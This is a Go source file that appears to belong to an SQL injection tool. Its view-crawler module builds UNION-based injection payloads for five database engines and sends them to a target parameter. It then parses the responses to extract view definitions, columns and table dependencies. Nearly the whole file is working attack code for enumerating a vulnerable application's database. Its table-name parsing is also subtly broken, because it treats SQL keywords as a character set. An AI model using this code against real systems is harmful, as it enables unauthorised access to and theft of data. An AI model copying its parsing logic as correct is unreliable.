package crawl

import (
	"fmt"
	"strings"
	"hackit/sqli/go/utils"
)

// ViewCrawler extracts view definitions, dependencies, and lineage
type ViewCrawler struct {
	engine EngineInterface
	log    *utils.Logger
}

func NewViewCrawler(e EngineInterface) *ViewCrawler {
	return &ViewCrawler{engine: e, log: e.GetLogger()}
}

// ExtractViewsDeep extracts views with full definitions and dependencies
func (vc *ViewCrawler) ExtractViewsDeep(param, dbms, database string) []ViewInfo {
	var views []ViewInfo

	switch {
	case strings.Contains(dbms, "MySQL"), strings.Contains(dbms, "MariaDB"):
		views = vc.extractMySQLViews(param, database)
	case strings.Contains(dbms, "PostgreSQL"):
		views = vc.extractPostgresViews(param, database)
	case strings.Contains(dbms, "MSSQL"):
		views = vc.extractMSSQLViews(param, database)
	case strings.Contains(dbms, "Oracle"):
		views = vc.extractOracleViews(param, database)
	case strings.Contains(dbms, "SQLite"):
		views = vc.extractSQLiteViews(param)
	}

	return views
}

func (vc *ViewCrawler) extractMySQLViews(param, database string) []ViewInfo {
	query := fmt.Sprintf("SELECT TABLE_NAME, VIEW_DEFINITION, IS_UPDATABLE, 'N/A', 'N/A' FROM INFORMATION_SCHEMA.VIEWS WHERE TABLE_SCHEMA='%s'", database)
	return vc.fetchViews(param, query)
}

func (vc *ViewCrawler) extractPostgresViews(param, database string) []ViewInfo {
	query := "SELECT viewname, definition, 'YES', 'N/A', 'N/A' FROM pg_catalog.pg_views WHERE schemaname='public'"
	return vc.fetchViews(param, query)
}

func (vc *ViewCrawler) extractMSSQLViews(param, database string) []ViewInfo {
	query := fmt.Sprintf("SELECT v.name, m.definition, 'YES', SCHEMA_NAME(v.schema_id), 'N/A' FROM [%s].sys.views v JOIN [%s].sys.sql_modules m ON v.object_id=m.object_id", database, database)
	return vc.fetchViews(param, query)
}

func (vc *ViewCrawler) extractOracleViews(param, database string) []ViewInfo {
	query := fmt.Sprintf("SELECT VIEW_NAME, TEXT, 'YES', OWNER, 'N/A' FROM ALL_VIEWS WHERE OWNER='%s'", database)
	return vc.fetchViews(param, query)
}

func (vc *ViewCrawler) extractSQLiteViews(param string) []ViewInfo {
	query := "SELECT name, sql, 'YES', 'N/A', 'N/A' FROM sqlite_master WHERE type='view'"
	return vc.fetchViews(param, query)
}

func (vc *ViewCrawler) fetchViews(param, query string) []ViewInfo {
	payload := fmt.Sprintf("' UNION ALL SELECT %s-- -", query)
	body, _, _, err := vc.engine.Request(payload, param)
	if err != nil {
		return nil
	}

	var views []ViewInfo
	lines := strings.Split(body, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if len(line) == 0 || strings.HasPrefix(line, "<") || strings.HasPrefix(line, "<!") {
			continue
		}
		parts := strings.Split(line, "\t")
		if len(parts) < 2 {
			parts = strings.Split(line, ",")
		}
		if len(parts) >= 2 {
			view := ViewInfo{
				Name:       strings.Trim(parts[0], "'\" "),
				Definition: strings.Trim(parts[1], "'\" "),
				IsUpdatable: len(parts) >= 3 && strings.ToUpper(strings.Trim(parts[2], "'\" ")) == "YES",
			}
			if len(parts) >= 5 {
				view.Columns = parseViewColumns(view.Definition)
			}
			views = append(views, view)
		}
	}
	return views
}

// parseViewColumns extracts referenced columns from view definition
func parseViewColumns(definition string) []string {
	var columns []string
	upper := strings.ToUpper(definition)

	// Find SELECT clause columns
	if idx := strings.Index(upper, "SELECT"); idx >= 0 {
		selectPart := definition[idx+6:]
		if fromIdx := strings.Index(strings.ToUpper(selectPart), "FROM"); fromIdx >= 0 {
			colPart := selectPart[:fromIdx]
			cols := strings.Split(colPart, ",")
			for _, c := range cols {
				c = strings.TrimSpace(c)
				c = strings.Trim(c, "'\"`[]")
				if len(c) > 0 && len(c) < 100 {
					// Remove aliases
					if asIdx := strings.LastIndex(strings.ToUpper(c), " AS "); asIdx >= 0 {
						c = strings.TrimSpace(c[asIdx+4:])
					}
					columns = append(columns, c)
				}
			}
		}
	}
	return columns
}

// ExtractViewDependency extracts table dependencies for each view
func (vc *ViewCrawler) ExtractViewDependency(definition string) []string {
	var tables []string
	upper := strings.ToUpper(definition)

	for _, keyword := range []string{"FROM", "JOIN", "INNER JOIN", "LEFT JOIN", "RIGHT JOIN", "FULL JOIN", "CROSS JOIN"} {
		idx := 0
		for {
			pos := strings.Index(upper[idx:], keyword)
			if pos < 0 {
				break
			}
			pos += idx + len(keyword)
			// Extract table name (up to space, newline, or WHERE/ON/AND)
			end := strings.IndexAny(upper[pos:], " \n\t\rWHEREONANDGROUPORDERLIMITUNION)")
			if end < 0 {
				end = len(upper) - pos
			}
			tbl := strings.TrimSpace(definition[pos : pos+end])
			tbl = strings.Trim(tbl, "'\"`[];")
			if len(tbl) > 0 && !containsString(tables, tbl) {
				tables = append(tables, tbl)
			}
			idx = pos + end
		}
	}
	return tables
}

// BuildViewLineage builds a dependency graph of views → tables
func (vc *ViewCrawler) BuildViewLineage(views []ViewInfo) map[string][]string {
	lineage := make(map[string][]string)
	for _, v := range views {
		deps := vc.ExtractViewDependency(v.Definition)
		lineage[v.Name] = deps
	}
	return lineage
}

func containsString(slice []string, s string) bool {
	for _, item := range slice {
		if strings.EqualFold(item, s) {
			return true
		}
	}
	return false
}
